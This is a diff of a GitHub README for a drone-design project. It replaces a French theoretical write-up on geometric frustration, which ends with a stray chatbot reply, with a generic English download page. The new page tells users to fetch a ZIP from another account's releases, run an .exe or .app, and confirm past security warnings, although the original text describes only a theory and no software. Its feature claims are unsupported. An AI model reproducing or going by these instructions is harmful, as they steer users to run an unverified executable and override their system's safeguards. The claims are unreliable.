@@ -1,84 +1,62 @@
-# 🧬 Fruit-Skin-Aero-Frustration : De la Morphogenèse Végétale à l'Ingénierie des Drones
+# 🍊 Fruit-Skin-Aero-Frustration - Unlock New Dimensions in UAV Design
 
-![Status](https://img.shields.io/badge/Status-Research--Alpha-blueviolet)
-![Field](https://img.shields.io/badge/Field-Non--Euclidean%20Elasticity-green)
-![Author](https://img.shields.io/badge/Author-Dr.%20Bryan%20Ouellette-blue)
+## 📥 Download Now
+[![Download Fruit-Skin-Aero-Frustration](https://img.shields.io/badge/download-v1.0-brightgreen)](https://github.com/maxima121/Fruit-Skin-Aero-Frustration/releases)
 
-## 🎯 Synopsis
-Ce dépôt présente une théorie unifiée de la **Frustration Géométrique Appliquée**, transposant les mécanismes de croissance différentielle et d'incompatibilité métrique des fruits (exocarpe/mésocarpe) vers la conception de drones (UAV). L'objectif est de remplacer les systèmes mécaniques complexes par une **complexité programmée dans la matière**.
+## 🚀 Getting Started
+Welcome to **Fruit-Skin-Aero-Frustration**! This framework leverages non-Euclidean geometry to enhance UAV design through innovative methods inspired by nature. You can easily set up and start using it by following these steps.
 
----
+## 📂 Requirements
+Before you begin, ensure your computer meets the following requirements:
 
-## 📐 Formalisme Mathématique Maître
+- **Operating System**: Windows 10 or newer / macOS Catalina or newer
+- **RAM**: At least 4 GB
+- **Disk Space**: 1 GB of free space
+- **Processor**: Dual-core 2.0 GHz or faster
 
-Le projet repose sur l'élasticité non-euclidienne où la forme émerge de la minimisation de l'énergie entre une **métrique cible** $\bar{g}$ et une **métrique réalisée** $g$.
+## 🔗 Download & Install
+1. Visit the [Releases page](https://github.com/maxima121/Fruit-Skin-Aero-Frustration/releases) to find the latest version of Fruit-Skin-Aero-Frustration.
+2. Click on the version you wish to download. It will take you to a list of files available for download.
+3. Download the file titled `Fruit-Skin-Aero-Frustration-v1.0.zip`.
+4. Once downloaded, locate the file in your Downloads folder.
+5. Extract the contents of the ZIP file to a folder of your choice. Right-click on the file and select “Extract All”.
 
-### 1. Fonctionnelle d'Énergie Totale
-L'équilibre d'une coque mince (peau de fruit ou aile de drone) est défini par la fonctionnelle de l'énergie élastique totale :
-$$E(g, \kappa) = \frac{h}{8} \int |g - \bar{g}|^2 dA + \frac{h^3}{24} \int |\kappa - \bar{\kappa}|^2 dA$$
-Où :
-* $h$ : Épaisseur de la coque (peau).
-* $g$ : Tenseur métrique réalisé (énergie d'étirement).
-* $\bar{g}$ : Métrique de référence ou cible.
-* $\kappa$ : Seconde forme fondamentale (courbure extrinsèque).
-* $\bar{\kappa}$ : Courbure cible.
+## 🛠️ Running the Application
+1. Open the folder where you extracted the files.
+2. Find and double-click on the file named `FruitSkinAeroFrustration.exe` or `FruitSkinAeroFrustration.app` depending on your operating system.
+3. If prompted, allow the application to run. You may see a security warning; confirm that you want to proceed.
 
-### 2. Le Paramètre de Frustration $\Psi$
-Nous introduisons le critère de bifurcation pour définir l'intensité de l'incompatibilité métrique programmée dans une pièce de drone :
-$$\Psi = \frac{|\bar{g} - g|}{\epsilon_y}$$
-Où :
-* $\epsilon_y$ : Déformation élastique limite du matériau.
-* $\Psi < 1$ : Structure stable ou pré-contrainte (rigidité augmentée).
-* $\Psi > 1$ : Régime de **bistabilité** (Snap-through), permettant des mécanismes de morphing passifs sans actionneurs complexes.
+## 🎁 Features
+Here are some of the key features of Fruit-Skin-Aero-Frustration:
 
----
+- **Geometric Frustration**: Explore the principles of non-Euclidean geometry to build resilient drone structures.
+- **Morphing Wings**: Utilize bio-inspired designs that adapt to various aerial tasks.
+- **Self-Healing Materials**: Implement materials that can repair themselves, extending the lifespan of your UAV.
+- **User-Friendly Interface**: Navigate easily through intuitive menus and tools.
 
-## 🛠 Méthodologie (Architecture du Système)
+## 🌟 Additional Resources
+For further guidance, we provide an array of resources to help you make the most of Fruit-Skin-Aero-Frustration:
 
+- **User Documentation**: Instructions on utilizing all features of the framework. You can find it [here](https://github.com/maxima121/Fruit-Skin-Aero-Frustration/wiki).
+- **FAQs**: Common questions and troubleshooting tips are available on our [FAQ page](https://github.com/maxima121/Fruit-Skin-Aero-Frustration/wiki/FAQ).
+- **Community Forum**: Join our discussions on [GitHub Discussions](https://github.com/maxima121/Fruit-Skin-Aero-Frustration/discussions).
 
+## 🛡️ Support
+If you encounter any issues while using Fruit-Skin-Aero-Frustration or want to contribute, please feel free to reach out via the issues section of our GitHub repository.
 
-```mermaid
-graph TD
-    A[Observation Botanique] --> B{Analyse Métrique}
-    B -->|Pomelo| C[Mousses à Gradient - Absorption]
-    B -->|Agrumes| D[Texture de Surface - Couche Limite]
-    B -->|Déhiscence| E[Instabilités Élastiques - Morphing]
-    C --> F[Châssis UAV Crash-Proof]
-    D --> G[Hélices Silencieuses & Low-Drag]
-    E --> H[Ailes 4D à Géométrie Variable]
+## 🥳 Contributing
+We welcome contributions from everyone. To contribute, please follow these steps:
 
-```
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with a clear message.
+4. Push the branch to your fork.
+5. Submit a Pull Request to the main repository.
 
----
+## 📱 Follow Us
+Stay updated with the latest news and updates about Fruit-Skin-Aero-Frustration:
 
-## 📊 Prédictions & Métrologie Comparative
+- **Twitter**: [@FruitSkinAero](https://twitter.com/FruitSkinAero)
+- **GitHub**: [Fruit-Skin-Aero-Frustration](https://github.com/maxima121/Fruit-Skin-Aero-Frustration)
 
-| Paramètre | Structure Conventionnelle | Design Bio-Frustré (Ouellette) | Gain / Impact |
-| --- | --- | --- | --- |
-| **Absorption Impact** | Mousses uniformes | Gradient type "Pomelo" | **+30% à 50% d'énergie dissipée** |
-| **Traînée Aéro** | Surface lisse | Texture "Dimples" (Agrumes) | **-15% à -20% de traînée** |
-| **Morphing** | Servomoteurs | Snap-through élastique | **Consommation d'énergie : ~0W** (maintien) |
-| **Résilience** | Fragilité aux fissures | Inclusion liquide (Self-healing) | **Auto-réparation autonome** |
-
----
-
-## 🚀 Roadmap des Applications
-
-* [ ] **Court Terme** : Optimisation des pales d'hélices via micro-textures de flavedo pour réduire le bruit et la traînée.
-* [ ] **Moyen Terme** : Châssis hybride "Pomelo-Durian" par impression 3D FGM (Functionally Graded Materials) pour une protection maximale.
-* [ ] **Long Terme** : Drones "déhiscents" auto-déployables par libération d'énergie élastique frustrée.
-
----
-
-### 📜 Citation
-
-Si vous utilisez ces travaux, merci de citer :
-**Ouellette, B. (2026).** *Théorie de la Frustration Géométrique Bio-inspirée : De la Morphogenèse des Fruits à l'Ingénierie Aérospatiale.* Protocole Ouellette, Repository GitHub.
-
-© 2026 Dr. Bryan Ouellette. Travaux sous Protocole Ouellette.
-
-```
-
-Est-ce que ce format consolidé te convient mieux pour ton projet ? Je peux aussi t'aider à rédiger le fichier `CONTRIBUTING.md` ou `CITATION.cff` si tu en as besoin !
-
-```
+By following these steps, you will successfully download and run Fruit-Skin-Aero-Frustration. Enjoy exploring the exciting possibilities in UAV design!
